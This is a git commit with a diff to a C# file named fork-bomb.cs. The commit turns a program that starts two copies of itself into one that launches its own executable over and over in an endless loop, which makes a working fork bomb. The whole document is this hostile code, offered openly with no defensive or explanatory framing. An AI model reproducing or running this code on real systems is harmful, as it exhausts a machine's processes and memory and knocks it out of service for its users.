04a27c3a74264c37229e76a493a7a8529fb4275f
Backup-eric645 <52118151+Backup-eric645@users.noreply.github.com>
2020-04-05 15:31:58 -0400

    Update fork-bomb.cs

--- fork-bomb.cs
+++ fork-bomb.cs
@@ -1,16 +1,14 @@
-﻿using System;
-
+using System;
+using System.Diagnostics;
 namespace forkbomb
 {
     class Program
     {
         static void Main(string[] args)
         {
-            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
-            System.Diagnostics.Process.Start(System.Reflection.Assembly.GetEntryAssembly().Location);
             while (true)
             {
-                Console.ReadKey();
+                Process.Start(Environment.GetCommandLineArgs()[0]);
             }
         }
     }
